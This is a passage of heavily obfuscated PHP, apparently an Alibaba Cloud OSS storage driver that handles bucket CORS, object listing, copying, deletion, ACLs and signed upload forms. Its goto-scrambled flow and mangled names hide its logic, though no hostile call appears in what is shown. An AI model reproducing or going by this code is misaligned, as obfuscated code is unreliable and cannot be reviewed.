->addAllowedMethod($BîÁˆˆÎ­[158]); goto dó”òùŠã; dãƒ°ƒÎç†: $dçÔõ—» ->addAllowedOrigin($BîÁˆˆÎ­[1284]); $dçÔõ—» ->addAllowedMethod($BîÁˆˆÎ­[1285]); $dçÔõ—» ->addAllowedMethod($BîÁˆˆÎ­[1286]); goto E¥°Ò®ó©¶; cï¼×¡…‹½: $Càé‹›Üˆ»->addRule($dçÔõ—» ); try { $this->client->putBucketCors($this->bucket, $Càé‹›Üˆ»); } catch (OSS\Core\OssException $fê¢¥¢†¾Ş) { return !1; } return !0; goto CøÑïäÎ½; dó”òùŠã: $dçÔõ—» ->setMaxAgeSeconds(600); $dçÔõ—» ->addExposeHeader($BîÁˆˆÎ­[1289]); $dçÔõ—» ->addAllowedHeader($BîÁˆˆÎ­[1284]); goto cï¼×¡…‹½; CøÑïäÎ½: } public function getBucketCors() { goto c±±Æ“‡Ñ³; dÙäÌ¾†¨: $dŒ²‚™¬ = $CñÀ«à¨ïŒ[0]->getMaxAgeSeconds(); $BëíŒ¦’îî = $CñÀ«à¨ïŒ[0]->getExposeHeaders(); $AÃíˆóÍ‘’ = $CñÀ«à¨ïŒ[0]->getAllowedHeaders(); goto Cï©Ö´ÖÏ; Cï©Ö´ÖÏ: return array($b‹Æœ¼¼Ã[181] => isset($eãùšÚóğ[0]) ? $eãùšÚóğ[0] : $b‹Æœ¼¼Ã[33], $b‹Æœ¼¼Ã[185] => $BÜ‰ó‹ÒÖ, $b‹Æœ¼¼Ã[1290] => $dŒ²‚™¬, $b‹Æœ¼¼Ã[1291] => isset($BëíŒ¦’îî[0]) ? $BëíŒ¦’îî[0] : $b‹Æœ¼¼Ã[33], $b‹Æœ¼¼Ã[183] => isset($AÃíˆóÍ‘’[0]) ? $AÃíˆóÍ‘’[0] : $b‹Æœ¼¼Ã[33]); goto FÖ©ê¡ƒã; c±±Æ“‡Ñ³: $b‹Æœ¼¼Ã =& $_SERVER[ä°„ä°º]; $FÊë³™ÇÓ˜ = null; try { $FÊë³™ÇÓ˜ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $a§ó‹–ø©È) { return null; } goto e‚Ù‰’ò«å; e‚Ù‰’ò«å: if (!$FÊë³™ÇÓ˜ || !($CñÀ«à¨ïŒ = $FÊë³™ÇÓ˜->getRules())) { return null; } $eãùšÚóğ = $CñÀ«à¨ïŒ[0]->getAllowedOrigins(); $BÜ‰ó‹ÒÖ = $CñÀ«à¨ïŒ[0]->getAllowedMethods(); goto dÙäÌ¾†¨; FÖ©ê¡ƒã: } public function isBucketCors() { goto AŠ«—â—µ„; AŠ«—â—µ„: $f•÷¡÷½êƒ =& $_SERVER[ä°„ä°º]; $CƒËéŠÕ = $this->getBucketCors(); if (!$CƒËéŠÕ || !is_array($CƒËéŠÕ)) { return !1; } goto EñŞÖÍ›’Ï; AĞôõº«å³: $d³²Ìƒ†’‚ = array($f•÷¡÷½êƒ[186], $f•÷¡÷½êƒ[187], $f•÷¡÷½êƒ[188], $f•÷¡÷½êƒ[189], $f•÷¡÷½êƒ[190]); $BÀÔöî‰× = array_diff($d³²Ìƒ†’‚, $CÙ›“´¿º); return empty($BÀÔöî‰×); goto fÖøß…ÌÌ; EñŞÖÍ›’Ï: if ($CƒËéŠÕ[$f•÷¡÷½êƒ[181]] != $f•÷¡÷½êƒ[182] || $CƒËéŠÕ[$f•÷¡÷½êƒ[183]] != $f•÷¡÷½êƒ[182]) { return !1; } $CÙ›“´¿º = array_map($f•÷¡÷½êƒ[184], $CƒËéŠÕ[$f•÷¡÷½êƒ[185]]); if (!is_array($CÙ›“´¿º)) { $CÙ›“´¿º = array(); } goto AĞôõº«å³; fÖøß…ÌÌ: } public function mkfile($BÔ™Ş†Ö Ô, $CŠÒòÁµ© = '', $F›ï÷ÖªÜÃ = REPEAT_RENAME) { $bÆÉºèä½æ = $this->setContent($BÔ™Ş†Ö Ô, $CŠÒòÁµ©); if ($bÆÉºèä½æ !== !1) { return $this->getPathOuter($BÔ™Ş†Ö Ô); } return !1; } public function mkdir($d‰ì¡‰Ûè, $D§ªº Ò† = REPEAT_SKIP) { if ($this->_isFolder($d‰ì¡‰Ûè)) { return $this->getPathOuter($d‰ì¡‰Ûè); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($d‰ì¡‰Ûè)); } catch (OSS\Core\OssException $FÔØøãÂ­) { return !1; } return $this->getPathOuter($d‰ì¡‰Ûè); } private function fileList($B¹çùá…¡¯, $FìéñáĞŠ = '', $aî¡š÷À„“ = 0) { goto D³á®ğÂõË; f……ä Õ¥Ş: $d¥¶„µ¶°“ = $Fè‡±×„…[33]; $a¤â¥›„ = 1000; $B›ä”İ–¾ = $this->listItemCache === !1 ? !1 : !0; goto eĞ„ÜØ®œº; Bå‚Ğí¥Ÿ: return array($Fè‡±×„…[75] => $c¬à’å‰Ö, $Fè‡±×„…[74] => $aŸ¡èçÌó…); goto b«®ã‡Áæñ; D³á®ğÂõË: $Fè‡±×„… =& $_SERVER[ä°„ä°º]; $B¹çùá…¡¯ = trim($B¹çùá…¡¯, $Fè‡±×„…[8]); $e¾›é×“íÉ = empty($B¹çùá…¡¯) && $B¹çùá…¡¯ !== $Fè‡±×„…[191] ? $Fè‡±×„…[33] : $B¹çùá…¡¯ . $Fè‡±×„…[8]; goto f……ä Õ¥Ş; eĞ„ÜØ®œº: $c¬à’å‰Ö = $aŸ¡èçÌó… = array(); while (!0) { check_abort(); $f¼Şë»‘Ş¿ = array($Fè‡±×„…[1292] => $FìéñáĞŠ, $Fè‡±×„…[1293] => $e¾›é×“íÉ, $Fè‡±×„…[1294] => $a¤â¥›„, $Fè‡±×„…[1295] => $d¥¶„µ¶°“); try { $cĞÛêñÆ‚È = $this->client->listObjects($this->bucket, $f¼Şë»‘Ş¿); } catch (OSS\Core\OssException $bååºî‹œ) { break; } $d¥¶„µ¶°“ = $cĞÛêñÆ‚È->getNextMarker(); $A­ï«Æˆ¦ = $cĞÛêñÆ‚È->getObjectList(); $d‡Ö¢Â¼·˜ = $cĞÛêñÆ‚È->getPrefixList(); foreach ($A­ï«Æˆ¦ as $cÑõ—©ƒÚª) { goto c¢œ½Şì; cĞ…§ùç¼: if ($B›ä”İ–¾) { $this->cacheMethod($Fè‡±×„…[199], $a°“ÆÓ­œ, $bÊŸÑÔ»ô³); $this->cacheMethod($Fè‡±×„…[200], $a°“ÆÓ­œ, array($Fè‡±×„…[78] => $Eƒó…ñÔ›×, $Fè‡±×„…[1296] => $Eƒó…ñÔ›×, $Fè‡±×„…[84] => strtotime($cšˆÃå¤˜‰), $Fè‡±×„…[1297] => $cšˆÃå¤˜‰)); } if ($bÊŸÑÔ»ô³) { $c¬à’å‰Ö[] = $a°“ÆÓ­œ; continue; } $aŸ¡èçÌó…[] = $BÏŸÃ„±Ğ¹; goto cµš¢§—¡“; e•İ³±Çç‚: $cšˆÃå¤˜‰ = $cÑõ—©ƒÚª->getLastModified(); $BÏŸÃ„±Ğ¹ = $aî¡š÷À„“ ? array($Fè‡±×„…[28] => $a°“ÆÓ­œ, $Fè‡±×„…[78] => $Eƒó…ñÔ›×, $Fè‡±×„…[197] => strtotime($cšˆÃå¤˜‰)) : $a°“ÆÓ­œ; $bÊŸÑÔ»ô³ = $Eƒó…ñÔ›× == 0 && substr($a°“ÆÓ­œ, strlen($a°“ÆÓ­œ) - 1, 1) == $Fè‡±×„…[8] ? !0 : !1; goto cĞ…§ùç¼; c¢œ½Şì: if ($cÑõ—©ƒÚª->getKey() == $e¾›é×“íÉ) { continue; } $a°“ÆÓ­œ = $cÑõ—©ƒÚª->getKey(); $Eƒó…ñÔ›× = $cÑõ—©ƒÚª->getSize(); goto e•İ³±Çç‚; cµš¢§—¡“: } foreach ($d‡Ö¢Â¼·˜ as $EÁù‚’‹¦³) { $c¬à’å‰Ö[] = $EÁù‚’‹¦³->getPrefix(); if ($B›ä”İ–¾) { $this->cacheMethod($Fè‡±×„…[199], $a°“ÆÓ­œ, !0); } } if ($d¥¶„µ¶°“ === $Fè‡±×„…[33]) { break; } } if ($B›ä”İ–¾) { $this->cacheMethod($Fè‡±×„…[199], $B¹çùá…¡¯, !0); } goto Bå‚Ğí¥Ÿ; b«®ã‡Áæñ: } public function copyFile($aõø©©ˆ, $d¡ÚŒ»êª) { $CïÌéŠ½… = $this->size($aõø©©ˆ); if ($CïÌéŠ½… < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $aõø©©ˆ, $this->bucket, $this->pathEncode($d¡ÚŒ»êª)); } catch (OSS\Core\OssException $d¼¦¤ŞÜãƒ) { return !1; } return $this->getPathOuter($d¡ÚŒ»êª); } $càÚ°ÎÀç´ = $this->multiCopyObject($aõø©©ˆ, $d¡ÚŒ»êª, $CïÌéŠ½…); return $càÚ°ÎÀç´ ? $this->getPathOuter($d¡ÚŒ»êª) : !1; } private function multiCopyObject($EäôÍÇˆŸ¦, $B¤¬ÜµÛ¯ï, $B•–é‰¢õ) { $Fğä”ïìÑ =& $_SERVER[ä°„ä°º]; try { goto B’„”§„øØ; c•‰³ÑÍÎØ: $AÄ ¥ù¬ÕÛ = array(); foreach ($e¿¾½¤Æ¼ as $b¬ˆ¦—–ˆ => $FÁÉ¹“Í) { $AÄ ¥ù¬ÕÛ[] = array($Fğä”ïìÑ[1302] => $b¬ˆ¦—–ˆ + 1, $Fğä”ïìÑ[1303] => $FÁÉ¹“Í); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($B¤¬ÜµÛ¯ï), $A­ Ÿ™ÔÄˆ, $AÄ ¥ù¬ÕÛ); goto bäĞ‹ˆˆÌ…; B’„”§„øØ: $e¦µ£ÄÏ¥ = array(); if ($C ØÊºíİÚ = $this->hashMd5($EäôÍÇˆŸ¦)) { $e¦µ£ÄÏ¥ = array(OSS\OssClient::OSS_HEADERS => array($Fğä”ïìÑ[1298] => $C ØÊºíİÚ)); } $A­ Ÿ™ÔÄˆ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($B¤¬ÜµÛ¯ï), $e¦µ£ÄÏ¥); goto B´Ì¶ŒÓ‚ò; B´Ì¶ŒÓ‚ò: $e¼åÍ¡«Ì = 1; $e«“½ï¼àÕ = 0; $e¿¾½¤Æ¼ = array(); goto EÕµ­Â– ¹; EÕµ­Â– ¹: $eÛÒòĞƒÈ¯ = 1024 * 1024 * 10; $e˜µ“²­•› = $this->client->generateMultiuploadParts($B•–é‰¢õ, $eÛÒòĞƒÈ¯); foreach ($e˜µ“²­•› as $b¬ˆ¦—–ˆ => $c·õ¸¿Ê¦³) { $AØâğ¬¹‹ = $e«“½ï¼àÕ + (int) $c·õ¸¿Ê¦³[$Fğä”ïìÑ[1299]]; $Eƒ“—‹¶Á± = (int) $c·õ¸¿Ê¦³[$Fğä”ïìÑ[335]] + $AØâğ¬¹‹ - 1; $b‘ßÊö‰ = array($Fğä”ïìÑ[1300] => $AØâğ¬¹‹, $Fğä”ïìÑ[1301] => $Eƒ“—‹¶Á±); $e¿¾½¤Æ¼[] = $this->client->uploadPartCopy($this->bucket, $EäôÍÇˆŸ¦, $this->bucket, $this->pathEncode($B¤¬ÜµÛ¯ï), $e¼åÍ¡«Ì, $A­ Ÿ™ÔÄˆ, $b‘ßÊö‰); $e¼åÍ¡«Ì = $e¼åÍ¡«Ì + 1; } goto c•‰³ÑÍÎØ; bäĞ‹ˆˆÌ…: } catch (OSS\Core\OssException $f­ÚŒ“—Ú) { return !1; } return !0; } public function moveFile($aì¹•±…Ä´, $a®©±–¶Ú®) { if ($this->copyFile($aì¹•±…Ä´, $a®©±–¶Ú®)) { $this->remove($aì¹•±…Ä´); return $this->getPathOuter($a®©±–¶Ú®); } return !1; } public function delFile($dÂŠä±¯ø¹) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($dÂŠä±¯ø¹)); } catch (OSS\Core\OssException $aµ‚öí¤§Ë) { return !1; } return !0; } public function delFolder($e…õ¬æ…ùˆ) { goto D—ãõè¨‡Ú; D‚³”š¬¸›: $cˆ–÷•æ•Ê = $this->fileList($e…õ¬æ…ùˆ); $this->listItemCache = !0; $c®áÑìÃ·å = trim($e…õ¬æ…ùˆ, $CŒ£¤ó¶£[8]) . $CŒ£¤ó¶£[8]; goto F¸ª·Ãß¹Ê; F¸ª·Ãß¹Ê: if (!empty($e…õ¬æ…ùˆ) && $e…õ¬æ…ùˆ !== $CŒ£¤ó¶£[191] && !in_array($c®áÑìÃ·å, $cˆ–÷•æ•Ê[$CŒ£¤ó¶£[75]])) { $cˆ–÷•æ•Ê[$CŒ£¤ó¶£[75]][] = $c®áÑìÃ·å; } $cã‘ŒÌ¼áá = $this->delByBatch($cˆ–÷•æ•Ê[$CŒ£¤ó¶£[74]]); if (!$cã‘ŒÌ¼áá) { return !1; } goto FÃ°ŒÔóÀÌ; FÃ°ŒÔóÀÌ: $cã‘ŒÌ¼áá = $this->delByBatch($cˆ–÷•æ•Ê[$CŒ£¤ó¶£[75]]); if (!$cã‘ŒÌ¼áá) { return !1; } return $this->delFile($c®áÑìÃ·å); goto d–ê‚Ê¨³ô; D—ãõè¨‡Ú: $CŒ£¤ó¶£ =& $_SERVER[ä°„ä°º]; if (!$this->exist($e…õ¬æ…ùˆ)) { return !0; } $this->listItemCache = !1; goto D‚³”š¬¸›; d–ê‚Ê¨³ô: } private function delByBatch($DÜ¢èÒ¸á£) { foreach (array_chunk($DÜ¢èÒ¸á£, 1000) as $E×‘¹’¡æª) { try { $this->client->deleteObjects($this->bucket, $E×‘¹’¡æª); } catch (OSS\Core\OssException $BÌÍğ˜¦Òê) { return !1; } } return !0; } public function rename($AÓ¥Áí¢´, $dƒˆÑ°Ä£) { return $this->renameObject($AÓ¥Áí¢´, $dƒˆÑ°Ä£); } private function fileInfo($fÔî«çŒ, $EƒÚ½¢˜Ëù = false, $e÷ºˆÚÚ… = array()) { goto BÅÅ‚£Ó­; Cë²ÌêÑ”Å: return $dä½­‹ê±Å; goto bÁò™´ Ò’; FÆÉêÄÕ¡‚: $dä½­‹ê±Å[$fçé·ùê’ß[194]] = $dä½­‹ê±Å[$fçé·ùê’ß[84]] = 0; $dä½­‹ê±Å[$fçé·ùê’ß[195]] = $dä½­‹ê±Å[$fçé·ùê’ß[196]] = !0; if (empty($e÷ºˆÚÚ…)) { $BĞ±¬Íâ‹Œ = $this->objectMeta($fÔî«çŒ); if (!$BĞ±¬Íâ‹Œ) { return $dä½­‹ê±Å; } $e÷ºˆÚÚ… = array($fçé·ùê’ß[84] => strtotime($BĞ±¬Íâ‹Œ[$fçé·ùê’ß[1297]]), $fçé·ùê’ß[78] => $BĞ±¬Íâ‹Œ[$fçé·ùê’ß[1296]] + 0); } goto eø©àÆŞ´ğ; BÅÅ‚£Ó­: $fçé·ùê’ß =& $_SERVER[ä°„ä°º]; $dä½­‹ê±Å = array($fçé·ùê’ß[28] => $this->pathThis($fÔî«çŒ), $fçé·ùê’ß[76] => $this->getPathOuter($fÔî«çŒ), $fçé·ùê’ß[29] => $fçé·ùê’ß[193], $fçé·ùê’ß[78] => isset($e÷ºˆÚÚ…[$fçé·ùê’ß[78]]) ? $e÷ºˆÚÚ…[$fçé·ùê’ß[78]] : 0, $fçé·ùê’ß[168] => $this->ext($fÔî«çŒ)); if ($EƒÚ½¢˜Ëù) { return $dä½­‹ê±Å; } goto FÆÉêÄÕ¡‚; eø©àÆŞ´ğ: if (isset($e÷ºˆÚÚ…[$fçé·ùê’ß[78]])) { $dä½­‹ê±Å[$fçé·ùê’ß[78]] = $e÷ºˆÚÚ…[$fçé·ùê’ß[78]]; } if (isset($e÷ºˆÚÚ…[$fçé·ùê’ß[84]])) { $dä½­‹ê±Å[$fçé·ùê’ß[84]] = $e÷ºˆÚÚ…[$fçé·ùê’ß[84]]; } if (isset($e÷ºˆÚÚ…[$fçé·ùê’ß[197]]) && !trim($dä½­‹ê±Å[$fçé·ùê’ß[84]])) { $dä½­‹ê±Å[$fçé·ùê’ß[84]] = $e÷ºˆÚÚ…[$fçé·ùê’ß[197]]; } goto Cë²ÌêÑ”Å; bÁò™´ Ò’: } private function folderInfo($BïÒ†àŒîÖ, $cİáä„ÖÌ‹ = false, $D–´®ÙÌùË = array()) { goto aÇŒÈÓËÆí; aÀŒ¦¡´ì×: if (isset($D–´®ÙÌùË[$d½“¥èê–İ[84]])) { $BÒ­Ã¦Ä„Ã[$d½“¥èê–İ[84]] = $D–´®ÙÌùË[$d½“¥èê–İ[84]]; } if (isset($D–´®ÙÌùË[$d½“¥èê–İ[194]])) { $BÒ­Ã¦Ä„Ã[$d½“¥èê–İ[194]] = $D–´®ÙÌùË[$d½“¥èê–İ[194]]; } return $BÒ­Ã¦Ä„Ã; goto E«ŞËµ³îˆ; b†ÄĞÃòÎŒ: $BÒ­Ã¦Ä„Ã[$d½“¥èê–İ[194]] = $BÒ­Ã¦Ä„Ã[$d½“¥èê–İ[84]] = 0; $BÒ­Ã¦Ä„Ã[$d½“¥èê–İ[195]] = $BÒ­Ã¦Ä„Ã[$d½“¥èê–İ[196]] = !0; if (empty($D–´®ÙÌùË)) { $BïÒ†àŒîÖ = rtrim($BïÒ†àŒîÖ, $d½“¥èê–İ[8]) . $d½“¥èê–İ[8]; $b±‰‰Æ¡Ğò = $this->objectMeta($BïÒ†àŒîÖ); if (!$b±‰‰Æ¡Ğò) { return $BÒ­Ã¦Ä„Ã; } $D–´®ÙÌùË = array($d½“¥èê–İ[194] => $b±‰‰Æ¡Ğò[$d½“¥èê–İ[492]][$d½“¥èê–İ[1304]], $d½“¥èê–İ[84] => strtotime($b±‰‰Æ¡Ğò[$d½“¥èê–İ[1297]])); } goto aÀŒ¦¡´ì×; aÇŒÈÓËÆí: $d½“¥èê–İ =& $_SERVER[ä°„ä°º]; $BÒ­Ã¦Ä„Ã = array($d½“¥èê–İ[28] => $this->pathThis($BïÒ†àŒîÖ), $d½“¥èê–İ[76] => $this->getPathOuter($d½“¥èê–İ[8] . $BïÒ†àŒîÖ), $d½“¥èê–İ[29] => $d½“¥èê–İ[77]); if ($cİáä„ÖÌ‹) { return $BÒ­Ã¦Ä„Ã; } goto b†ÄĞÃòÎŒ; E«ŞËµ³îˆ: } public function listPath($cÀèºÔ¥‚Â, $aàìŞ„†¼ = false) { $DÀˆê¨ÖØ =& $_SERVER[ä°„ä°º]; $Bñ„ˆ¢„ñ´ = $this->fileList($cÀèºÔ¥‚Â, $DÀˆê¨ÖØ[8], !0); foreach ($Bñ„ˆ¢„ñ´[$DÀˆê¨ÖØ[75]] as $cÚ¨é‹ÖÜÉ => $Dß¸õë»Ò²) { $Bñ„ˆ¢„ñ´[$DÀˆê¨ÖØ[75]][$cÚ¨é‹ÖÜÉ] = $this->folderInfo($Dß¸õë»Ò², $aàìŞ„†¼, $Dß¸õë»Ò²); } foreach ($Bñ„ˆ¢„ñ´[$DÀˆê¨ÖØ[74]] as $cÚ¨é‹ÖÜÉ => $Dß¸õë»Ò²) { $Bñ„ˆ¢„ñ´[$DÀˆê¨ÖØ[74]][$cÚ¨é‹ÖÜÉ] = $this->fileInfo($Dß¸õë»Ò²[$DÀˆê¨ÖØ[28]], $aàìŞ„†¼, $Dß¸õë»Ò²); } return $Bñ„ˆ¢„ñ´; } public function has($b±†Ó¼–æ, $b²¼¤Ã ‹È = false, $d¦Œ™Ÿµ… = true) { goto dÓÍ”ñ¸; f–òÎ–“İ‰: $eÅ–¡…º”ì = $dÖœÖÚµøÊ[33]; $c§³éĞîëÊ = 500; $f´ËÓ»Í™¶ = $BÜ³Ú‰¤Ÿİ = 0; goto EÎ…Ì³Ğ³±; dÓÍ”ñ¸: $dÖœÖÚµøÊ =& $_SERVER[ä°„ä°º]; $b±†Ó¼–æ = trim($b±†Ó¼–æ, $dÖœÖÚµøÊ[8]); $DõàŠèÅèŞ = empty($b±†Ó¼–æ) && $b±†Ó¼–æ !== $dÖœÖÚµøÊ[191] ? $dÖœÖÚµøÊ[33] : $b±†Ó¼–æ . $dÖœÖÚµøÊ[8]; goto f–òÎ–“İ‰; EÎ…Ì³Ğ³±: while (!0) { check_abort(); $FÌå÷ï¾Ä÷ = array($dÖœÖÚµøÊ[1292] => $dÖœÖÚµøÊ[8], $dÖœÖÚµøÊ[1293] => $DõàŠèÅèŞ, $dÖœÖÚµøÊ[1294] => $c§³éĞîëÊ, $dÖœÖÚµøÊ[1295] => $eÅ–¡…º”ì); try { $bÆ©‡»×Å = $this->client->listObjects($this->bucket, $FÌå÷ï¾Ä÷); } catch (OSS\Core\OssException $eÁ¿à¿±“¤) { break; } $eÅ–¡…º”ì = $bÆ©‡»×Å->getNextMarker(); $A­ëĞŒ•æ¯ = $bÆ©‡»×Å->getObjectList(); $bƒŒ…”ŠÔ¼ = $bÆ©‡»×Å->getPrefixList(); if ($b²¼¤Ã ‹È) { if (count($A­ëĞŒ•æ¯) > 1 || count($A­ëĞŒ•æ¯) == 1 && $A­ëĞŒ•æ¯[0]->getKey() != $DõàŠèÅèŞ) { $f´ËÓ»Í™¶ += count($A­ëĞŒ•æ¯) - 1; } if (!empty($bƒŒ…”ŠÔ¼)) { $BÜ³Ú‰¤Ÿİ += count($bƒŒ…”ŠÔ¼); } if ($eÅ–¡…º”ì === $dÖœÖÚµøÊ[33]) { break; } continue; } if ($d¦Œ™Ÿµ…) { if (!empty($A­ëĞŒ•æ¯)) { if (count($A­ëĞŒ•æ¯) > 1 || $A­ëĞŒ•æ¯[0]->getKey() != $DõàŠèÅèŞ) { return !0; } } } else { if (!empty($bƒŒ…”ŠÔ¼)) { return !0; } } if ($eÅ–¡…º”ì === $dÖœÖÚµøÊ[33]) { break; } } if ($b²¼¤Ã ‹È) { return array($dÖœÖÚµøÊ[203] => $f´ËÓ»Í™¶, $dÖœÖÚµøÊ[204] => $BÜ³Ú‰¤Ÿİ); } return !1; goto cÃùòˆÙ¼Å; cÃùòˆÙ¼Å: } public function listAll($e”´ĞÇÚæ) { $b™§Ø®¿œ =& $_SERVER[ä°„ä°º]; $eä´—ñâå„ = $this->fileList($e”´ĞÇÚæ, $b™§Ø®¿œ[33], !0); $DğªˆÃø¯— = array(); foreach ($eä´—ñâå„[$b™§Ø®¿œ[74]] as $DÈŞ¼¢®î) { $DğªˆÃø¯—[$DÈŞ¼¢®î[$b™§Ø®¿œ[28]]] = $DÈŞ¼¢®î[$b™§Ø®¿œ[78]]; } foreach ($eä´—ñâå„[$b™§Ø®¿œ[75]] as $DÈŞ¼¢®î) { if (is_string($DÈŞ¼¢®î)) { $DğªˆÃø¯—[$DÈŞ¼¢®î] = 0; } } return $this->listAllFiles($e”´ĞÇÚæ, array_keys($DğªˆÃø¯—), $DğªˆÃø¯—); } public function canRead($bª†‰Íòí²) { $b”Ê´Úä­µ =& $_SERVER[ä°„ä°º]; $e¬İ–õ¬¤é = $this->pathAcl($bª†‰Íòí²); return $e¬İ–õ¬¤é == $b”Ê´Úä­µ[1305] || $e¬İ–õ¬¤é == $b”Ê´Úä­µ[532] ? !0 : !1; } public function canWrite($Bó¡¹¬Èñº) { $C‘à®‹¾œà = $this->pathAcl($Bó¡¹¬Èñº); return $C‘à®‹¾œà == $_SERVER[ä°„ä°º][532] ? !0 : !1; } public function pathAcl($EäÂ´˜Ìæ) { goto F¿ô—ŠŠ†ï; d‹Î†öù•¡: return $c¼Û‹´©±; goto eØ“‰—öÓ; F¿ô—ŠŠ†ï: $cƒ©éØ  =& $_SERVER[ä°„ä°º]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $cÖ˜İëó† = $this->client->getObjectAcl($this->bucket, $this->pathEncode($EäÂ´˜Ìæ)); } catch (OSS\Core\OssException $a’«ÒÒºÃ¬) { return !1; } goto F§¬İêš; F§¬İêš: $c¼Û‹´©± = $cÖ˜İëó† == $cƒ©éØ [34] ? $this->bucketAcl : $cÖ˜İëó†; if ($c¼Û‹´©± == $cƒ©éØ [1306]) { return $cƒ©éØ [1305]; } if ($c¼Û‹´©± == $cƒ©éØ [1307]) { return $cƒ©éØ [532]; } goto d‹Î†öù•¡; eØ“‰—öÓ: } private function chmodPath($EÆ¼‰’ƒ­Õ, $a»‹·¨ƒô = '') { $B‡É‘’ÙÛÙ =& $_SERVER[ä°„ä°º]; $e—â¼œ­¸Æ = empty($a»‹·¨ƒô) ? $B‡É‘’ÙÛÙ[1307] : $a»‹·¨ƒô; $A‘›‡Ú×¸ = array($B‡É‘’ÙÛÙ[34], $B‡É‘’ÙÛÙ[192], $B‡É‘’ÙÛÙ[1306], $B‡É‘’ÙÛÙ[1307]); if (!in_array($e—â¼œ­¸Æ, $A‘›‡Ú×¸)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($EÆ¼‰’ƒ­Õ), $e—â¼œ­¸Æ); } catch (OSS\Core\OssException $B‹Ä±­£ŠŠ) { return !1; } return !0; } public function getContent($AÂßĞ¯ŸÈ) { return $this->fileSubstr($AÂßĞ¯ŸÈ, -1); } public function setContent($AÕ·ö‰¤¹±, $d–ˆ¿›ºÙ— = '') { $DËëñ©ìÛ¼ =& $_SERVER[ä°„ä°º]; try { $bßæŠêµÙÇ = $this->trafficLimit($DËëñ©ìÛ¼[1308]); $B¼ÒÙïŒœñ = $this->client->putObject($this->bucket, $this->pathEncode($AÕ·ö‰¤¹±), $d–ˆ¿›ºÙ—, $bßæŠêµÙÇ); } catch (OSS\Core\OssException $EÅ‘²âï) { return !1; } $bõøáØœğ¨ = array($DËëñ©ìÛ¼[1298] => trim($B¼ÒÙïŒœñ[$DËëñ©ìÛ¼[1309]], $DËëñ©ìÛ¼[116]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($AÕ·ö‰¤¹±))); $this->updateObjMeta($AÕ·ö‰¤¹±, $bõøáØœğ¨); return isset($B¼ÒÙïŒœñ[$DËëñ©ìÛ¼[1310]][$DËëñ©ìÛ¼[1257]]) ? !0 : !1; } private function updateObjMeta($FÈÜ˜×ùŸĞ, $fìàÉ‚ÅÉ) { $FÈÜ˜×ùŸĞ = $this->pathEncode($FÈÜ˜×ùŸĞ); try { $EÁµ”ÙÁ = array(OSS\OssClient::OSS_HEADERS => $fìàÉ‚ÅÉ); $this->client->copyObject($this->bucket, $FÈÜ˜×ùŸĞ, $this->bucket, $FÈÜ˜×ùŸĞ, $EÁµ”ÙÁ); } catch (OSS\Core\OssException $F”¡òÎ§«) { return !1; } return !0; } public function upload($e±Œï¹×Üš, $FÙ£„é¹âÜ, $F£¸‰ÍƒË“ = false, $A­¨“Æ¤¶ = REPEAT_REPLACE) { $EÂâªÖ¶ =& $_SERVER[ä°„ä°º]; $d¤÷°¾ÎŠ§ = trim($e±Œï¹×Üš, $EÂâªÖ¶[8]); $F ‹å£˜¢ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($EÂâªÖ¶[1298] => @md5_file($FÙ£„é¹âÜ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($e±Œï¹×Üš))); $F ‹å£˜¢ = $this->trafficLimit($EÂâªÖ¶[1308], $F ‹å£˜¢); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($d¤÷°¾ÎŠ§), $FÙ£„é¹âÜ, $F ‹å£˜¢); } catch (OSS\Core\OssException $B®÷Î¢ç¨Ô) { return !1; } return $this->getPathOuter($e±Œï¹×Üš); } public function getHost() { $cêåÉƒãñ‘ =& $_SERVER[ä°„ä°º]; $d¬á¤ÛËÏ = explode($cêåÉƒãñ‘[177], parent::getHost()); return $d¬á¤ÛËÏ[0] . $cêåÉƒãñ‘[177] . $this->bucket . $cêåÉƒãñ‘[95] . $d¬á¤ÛËÏ[1]; } public function uploadFormData($eÉÌÀéãƒ, $E©Ô‰êòë¥ = 3600) { goto D„øÊ½¾÷ó; DÙ›ÉÍçÏÔ: $Fèù¡ÊŞöİ = strpos($E®Š™Æ¢„, $dñ¥‘œÓÆ[294]); $E®Š™Æ¢„ = substr($E®Š™Æ¢„, 0, $Fèù¡ÊŞöİ) . $dñ¥‘œÓÆ[1312]; $fÇ¦¢Ì›ê¤ = 1048576000 * 5; goto aÄè«‹ÒÜõ; D„øÊ½¾÷ó: $dñ¥‘œÓÆ =& $_SERVER[ä°„ä°º]; if (!($e…ôìàªè¡ = $this->getHost())) { return !1; } $Fâø¶¡İÆ = $E©Ô‰êòë¥; goto Dî¥­Ï¿¿; CŠìĞçŞ£‰: $bêß³Ó±õ = base64_encode(hash_hmac($dñ¥‘œÓÆ[230], $a›œäğœœ‡, $this->secret, !0)); $eÃ—ÍŠƒòò = array($dñ¥‘œÓÆ[1222] => $a›œäğœœ‡, $dñ¥‘œÓÆ[1314] => $this->accessKey, $dñ¥‘œÓÆ[1218] => $dñ¥‘œÓÆ[1210], $dñ¥‘œÓÆ[1315] => $bêß³Ó±õ, $dñ¥‘œÓÆ[175] => $e…ôìàªè¡); $eÃ—ÍŠƒòò = $this->trafficLimit($dñ¥‘œÓÆ[1308], $eÃ—ÍŠƒòò); goto d„¿ô–––; Dî¥­Ï¿¿: $e×¡¸à°œ = date($dñ¥‘œÓÆ[1311], time() + $Fâø¶¡İÆ); $DÈëô…”±Ù = new DateTime($e×¡¸à°œ); $E®Š™Æ¢„ = $DÈëô…”±Ù->format(DateTime::ISO8601); goto DÙ›ÉÍçÏÔ; d„¿ô–––: return $eÃ—ÍŠƒòò; goto EÉ²Ğ´Ñ; aÄè«‹ÒÜõ: $cò†áª÷¤Ù = $this->pathFather($eÉÌÀéãƒ); $B÷„·­ÊÄ– = array($dñ¥‘œÓÆ[1212] => $E®Š™Æ¢„, 